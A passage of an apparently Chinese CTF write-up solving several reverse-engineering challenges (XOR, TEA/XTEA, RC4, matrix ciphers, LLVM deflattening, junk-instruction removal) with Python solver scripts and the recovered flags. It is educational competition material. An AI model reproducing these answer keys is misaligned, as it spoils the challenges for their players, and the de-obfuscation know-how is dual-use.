<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))]</span><br><span class="line"><span class="built_in">print</span>(pos)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(pos))</span><br><span class="line">num = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line">last = [num[k-<span class="number">48</span>] <span class="keyword">for</span> k <span class="keyword">in</span> pos]</span><br><span class="line"><span class="built_in">print</span>(last)</span><br></pre></td></tr></table></figure><p>逻辑为将flag按照num来编序号。</p><p>还原脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">M = matrix(Zmod(<span class="number">32</span>), [[<span class="number">18</span>, <span class="number">29</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">27</span>], [<span class="number">8</span>, <span class="number">31</span>, <span class="number">8</span>, <span class="number">23</span>, <span class="number">30</span>], [<span class="number">29</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">10</span>, <span class="number">21</span>], [<span class="number">18</span>, <span class="number">29</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">28</span>], [<span class="number">11</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">7</span>]])</span><br><span class="line">I = identity_matrix(Zmod(<span class="number">32</span>), <span class="number">5</span>)</span><br><span class="line">L = I*M^-<span class="number">1</span></span><br><span class="line">m = L.<span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">num = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line">table = <span class="string">&#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">flag = [table[num.index(m[i])] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># xtd4co_ymiunbbx3Aypsmbzii</span></span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;xtd4co_ymiunbbx3Aypsmbzii&#125;</code></p><p>​    </p><h3 id="幸运数字"><a href="#幸运数字" class="headerlink" title="幸运数字"></a>幸运数字</h3><blockquote><p>试试今天的运势</p></blockquote><p>按逻辑还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">13</span>,   <span class="number">7</span>,  <span class="number">29</span>,  <span class="number">37</span>,  <span class="number">29</span>, <span class="number">110</span>,  <span class="number">48</span>,  <span class="number">57</span>,  <span class="number">44</span>,  <span class="number">63</span>, </span><br><span class="line">   <span class="number">42</span>,  <span class="number">43</span>,  <span class="number">50</span>,  <span class="number">63</span>,  <span class="number">42</span>,  <span class="number">55</span>, <span class="number">110</span>,  <span class="number">48</span>,  <span class="number">48</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">48</span>,  <span class="number">45</span>,   <span class="number">1</span>,   <span class="number">7</span>,  <span class="number">49</span>,  <span class="number">43</span>,   <span class="number">1</span>,  <span class="number">57</span>,  <span class="number">31</span>,  <span class="number">59</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">45</span>,  <span class="number">27</span>,  <span class="number">58</span>,   <span class="number">1</span>,  <span class="number">12</span>, <span class="number">111</span>,  <span class="number">57</span>,  <span class="number">54</span>,  <span class="number">42</span>, </span><br><span class="line">   <span class="number">35</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">return</span> k*(k+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    x = [data[i]^(cal(k)%<span class="number">0xd3</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]</span><br><span class="line">    <span class="keyword">if</span> x[-<span class="number">1</span>] == <span class="number">125</span>:</span><br><span class="line">        <span class="built_in">print</span>(k, <span class="built_in">bytes</span>(x))</span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;C0ngratulati0nnnns_You_gAessEd_R1ght&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="听说cpp很难？"><a href="#听说cpp很难？" class="headerlink" title="听说cpp很难？"></a>听说cpp很难？</h3><blockquote><p>xxx师傅偶然听到有人说cpp很难，真的很难吗？不会吧，不会吧。于是，X师傅连忙出了一道给大伙儿涨涨信心。</p></blockquote><p>动调，得到逻辑为 $[(9+1) \oplus (f_i+10)]-9-1$。</p><p>爆破还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">77</span>, <span class="number">95</span>, <span class="number">61</span>, -<span class="number">123</span>, <span class="number">55</span>, <span class="number">104</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">39</span>, <span class="number">104</span>, <span class="number">81</span>, <span class="number">89</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">85</span>, <span class="number">91</span>, <span class="number">89</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">79</span>, <span class="number">87</span>, <span class="number">120</span>, <span class="number">120</span>, -<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">9</span>+<span class="number">1</span>)^(x+<span class="number">10</span>))-<span class="number">9</span>-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">f=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> cal(j) == c[i]:</span><br><span class="line">            f.append(j)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(f))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYCAnma1nG_y0u_maKe_it_1alaIa~~&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;Anma1nG_y0u_maKe_it_1alaIa~~&#125;</code></p><p>​    </p><h3 id="砍树"><a href="#砍树" class="headerlink" title="砍树"></a>砍树</h3><blockquote><p>你会安卓吗?我反正不会</p></blockquote><p>jadx查看apk，用IDA在so文件中查看主要逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">Java_com_sky_ezreeeee_MainActivity_I0o0I</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// [rsp+1Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v9; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v10; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v10 = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a3);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a4);</span><br><span class="line">  v6 = A0OWO0A(v10, v9);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, &amp;unk_14900, <span class="number">0x23</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    v7 = *(<span class="type">unsigned</span> __int8 *)(v6 + i) == (<span class="type">unsigned</span> __int8)dest[i];</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int8 *__fastcall <span class="title function_">A0OWO0A</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, <span class="type">const</span> <span class="type">unsigned</span> __int8 *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    a1[i] ^= a2[i % <span class="number">7</span>];</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单异或运算，提取密文：<code>002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218</code>，密钥：<code>Syclove</code>，Cyberchef异或操作得 <code>SYC&#123;t@ke_thE_bul1_By_the_h0rns_TAT&#125;</code>。</p><p>​    </p><h3 id="flower-or-tea"><a href="#flower-or-tea" class="headerlink" title="flower-or-tea"></a>flower-or-tea</h3><blockquote><p>Flower ?or tea? or flower tea?</p></blockquote><p>去除jmp花指令，全局替换 <code>74 03 75 01 XX</code> 为 <code>90 90 90 90 90</code> (NOP)。</p><p>看伪码为魔改XTEA算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = [<span class="number">75</span>,  <span class="number">70</span>, <span class="number">249</span>, <span class="number">154</span>, <span class="number">158</span>, <span class="number">184</span>,  <span class="number">23</span>, <span class="number">196</span>,  <span class="number">19</span>, <span class="number">167</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">178</span>, <span class="number">232</span>, <span class="number">169</span>,  <span class="number">59</span>, <span class="number">201</span>,  <span class="number">78</span>, <span class="number">228</span>, <span class="number">243</span>, <span class="number">148</span>, </span><br><span class="line">  <span class="number">181</span>,  <span class="number">42</span>, <span class="number">204</span>, <span class="number">181</span>,  <span class="number">44</span>, <span class="number">228</span>,  <span class="number">81</span>,  <span class="number">68</span>, <span class="number">154</span>,  <span class="number">40</span>, </span><br><span class="line">  <span class="number">138</span>, <span class="number">122</span>,   <span class="number">8</span>, <span class="number">208</span>, <span class="number">200</span>,  <span class="number">83</span>,  <span class="number">73</span>, <span class="number">123</span>,  <span class="number">17</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">148</span>, <span class="number">215</span>, <span class="number">255</span>, <span class="number">155</span>, <span class="number">249</span>,  <span class="number">45</span>, <span class="number">255</span>,  <span class="number">94</span>,  <span class="number">49</span>,  <span class="number">37</span>, </span><br><span class="line">  <span class="number">231</span>,  <span class="number">23</span>, <span class="number">121</span>, <span class="number">153</span>, <span class="number">189</span>, <span class="number">223</span>,  <span class="number">58</span>,  <span class="number">27</span>, <span class="number">135</span>, <span class="number">143</span>, </span><br><span class="line">  <span class="number">172</span>, <span class="number">197</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">112</span>, <span class="number">134</span>, <span class="number">178</span>, <span class="number">105</span>, <span class="number">163</span>, </span><br><span class="line">  <span class="number">246</span>,  <span class="number">90</span>,  <span class="number">36</span>, <span class="number">218</span>, <span class="number">247</span>,  <span class="number">44</span>, <span class="number">175</span>, <span class="number">102</span>, <span class="number">123</span>,  <span class="number">52</span>, </span><br><span class="line">   <span class="number">96</span>,  <span class="number">77</span>, <span class="number">200</span>, <span class="number">185</span>,  <span class="number">47</span>, <span class="number">145</span>,  <span class="number">30</span>, <span class="number">145</span>, <span class="number">155</span>,  <span class="number">47</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">189</span>,  <span class="number">58</span>, <span class="number">115</span>, <span class="number">150</span>, <span class="number">203</span>, <span class="number">190</span>, <span class="number">104</span>, <span class="number">153</span>, <span class="number">197</span>, </span><br><span class="line">  <span class="number">233</span>,  <span class="number">19</span>,   <span class="number">0</span>, <span class="number">160</span>, <span class="number">164</span>,  <span class="number">78</span>,  <span class="number">47</span>, <span class="number">193</span>,  <span class="number">16</span>,  <span class="number">58</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">222</span>, <span class="number">148</span>, <span class="number">213</span>, <span class="number">196</span>, <span class="number">160</span>,  <span class="number">60</span>, <span class="number">152</span>, <span class="number">128</span>,  <span class="number">67</span>, </span><br><span class="line">   <span class="number">72</span>, <span class="number">118</span>,  <span class="number">47</span>, <span class="number">126</span>, <span class="number">137</span>, <span class="number">220</span>,  <span class="number">77</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">166</span>, </span><br><span class="line">   <span class="number">39</span>,  <span class="number">63</span>, <span class="number">153</span>,  <span class="number">49</span>, <span class="number">141</span>, <span class="number">181</span>,  <span class="number">23</span>, <span class="number">229</span>,  <span class="number">74</span>,  <span class="number">96</span>, </span><br><span class="line">  <span class="number">132</span>,  <span class="number">57</span>, <span class="number">144</span>, <span class="number">156</span>, <span class="number">129</span>,  <span class="number">68</span>, <span class="number">224</span>, <span class="number">244</span>, <span class="number">255</span>, <span class="number">237</span>, </span><br><span class="line">  <span class="number">244</span>,  <span class="number">60</span>]</span><br><span class="line">c = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">k = [<span class="number">32</span>,<span class="number">27</span>,<span class="number">39</span>,<span class="number">44</span>]</span><br><span class="line">rounds = <span class="number">54</span></span><br><span class="line">delta = <span class="number">0x31415927</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ x</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">fl = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fr = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    cc = c[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>][::-<span class="number">1</span>]</span><br><span class="line">    m = decrypt(cc)</span><br><span class="line">    fr = long_to_bytes(m[<span class="number">0</span>])[::-<span class="number">1</span>] + fr</span><br><span class="line">    fl += long_to_bytes(m[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fl)</span><br><span class="line"><span class="built_in">print</span>(fr)</span><br><span class="line"><span class="built_in">print</span>(fl+fr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_Yov_1ike_To_dRink_Flow3r_teA??&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="mySelf"><a href="#mySelf" class="headerlink" title="mySelf"></a>mySelf</h3><blockquote><p>Why so serious?</p></blockquote><p>动调，得到第二个对输入的加密逻辑为TEA算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = [<span class="number">240</span>, <span class="number">249</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">196</span>, <span class="number">148</span>,  <span class="number">97</span>, <span class="number">226</span>,  <span class="number">37</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">121</span>, <span class="number">128</span>,  <span class="number">25</span>, <span class="number">194</span>,  <span class="number">15</span>,  <span class="number">31</span>,  <span class="number">21</span>,  <span class="number">24</span>, <span class="number">106</span>, <span class="number">235</span>, </span><br><span class="line">  <span class="number">197</span>, <span class="number">114</span>, <span class="number">245</span>, <span class="number">132</span>, <span class="number">133</span>,  <span class="number">58</span>, <span class="number">204</span>,  <span class="number">64</span>, <span class="number">187</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">210</span>]</span><br><span class="line">c = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">k = [<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    cc = c[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>]</span><br><span class="line">    m = decrypt(cc,k)</span><br><span class="line">    flag += long_to_bytes(m[<span class="number">0</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(m[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;H0w_7o_R@te_YOurs31f_iNtRo?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h3><blockquote><p>美丽的IDA控制流视图 like Rainbow!</p></blockquote><p>LLVM去平坦化：</p><p><code>python3 deflat.py -f ./rainbow --addr 0x401160</code></p><p>再简单逆回去：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x627B44508E415865</span>,<span class="number">0x847D6C49547E4A57</span>,<span class="number">0x4877646060955B4F</span>,<span class="number">0x622D3C689F7B4D7D</span>]</span><br><span class="line">cc = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc)):</span><br><span class="line">    cc[i] ^= i</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        cc[i] -= <span class="number">18</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;TAke_1t_3asy_Just_a_STart!!&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="小黄鸭"><a href="#小黄鸭" class="headerlink" title="小黄鸭"></a>小黄鸭</h3><blockquote><p>小黄鸭的钥匙被一个叫毗外的大坏鸭偷走了,你能帮它找到钥匙吗?</p></blockquote><p>python反编译，得到1.pyc，修复为3.7的文件头 <code>550d0d0a</code>，还原python代码。</p><p>密文：<code>~h|p4gs`gJdN`thPwR`jDn`te1w`2|RNH</code></p><p>Cyberchef解：ROT93+Reverse+ROT12</p><p>得到：<code>SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3a&#123;s&#125;</code></p><p>修正一下得flag：<code>SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3ams&#125;</code></p><p>​    </p><h3 id="寻找初音未来"><a href="#寻找初音未来" class="headerlink" title="寻找初音未来"></a>寻找初音未来</h3><blockquote><p>正确的输入即可解救Miku~(图有点大了忍一下)</p></blockquote><p>Go程序，代码逻辑为RC4，动调得 <code>key=&#39;C&#39;*18</code>。</p><p>输入问题 <code>初音未来色是多少?(输入为16进制,如0x123abc则输入123abc)</code> 答案 <code>39C5BB</code>，提取密文，RC4解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">256</span></span><br><span class="line">S = [<span class="number">0</span>] * N</span><br><span class="line">key = <span class="string">&#x27;C&#x27;</span>*<span class="number">18</span></span><br><span class="line">Key = [<span class="number">0</span>] * N</span><br><span class="line"></span><br><span class="line">t = [ <span class="number">0x25</span>, <span class="number">0x6F</span>, <span class="number">0x3D</span>, <span class="number">0x6C</span>, <span class="number">0xF9</span>, <span class="number">0xE0</span>, <span class="number">0xCF</span>, <span class="number">0x3F</span>, <span class="number">0x2E</span>, <span class="number">0x24</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0x7B</span>, <span class="number">0x81</span>, <span 